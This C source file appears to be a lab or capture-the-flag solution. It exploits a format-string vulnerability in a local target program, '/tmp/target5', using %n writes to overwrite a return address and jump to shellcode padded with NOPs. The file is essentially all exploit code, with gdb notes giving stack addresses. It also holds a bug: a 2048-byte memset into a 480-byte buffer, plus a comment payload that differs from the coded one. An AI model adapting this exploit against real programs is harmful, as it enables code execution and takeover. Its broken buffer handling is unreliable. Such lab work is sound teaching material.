#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  // 0x08048455 <foo+33>

  // return addr is at 0xbffffc9c
  // original return addr was 0x080484c1
  // buf location 0xbffffab8
  // jump location 0xbffffbc1

  char instructions[480];

  // NOP instructions
  memset(instructions, '\x90', 2048);

  // overwrite each bit of the return addr
  char *overwrite = "\x9c\xfc\xff\xbfJUNK\x9d\xfc\xff\xbfJUNK\x9e\xfc\xff\xbf";
  // offset to get the right byte at each address
  char *format = "%X%X%250X%n%58X%n%48388x%n";

  // return addr
  strncpy(instructions, overwrite, strlen(overwrite));
  // shellcode
  strncpy(instructions+479-strlen(format)-strlen(shellcode), shellcode, strlen(shellcode));
  // format string
  strncpy(instructions+479-strlen(format), format, strlen(format)); 

  // r $(printf "\x9c\xfc\xff\xbfJUNK\x9d\xfc\xff\xbfJUNK\x9e\xfc\xff\xbf")%X%X%162X%n%67X%n%48900x%n
  // x/10x 0xbffffc9c

  args[0] = TARGET; args[1] = instructions; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
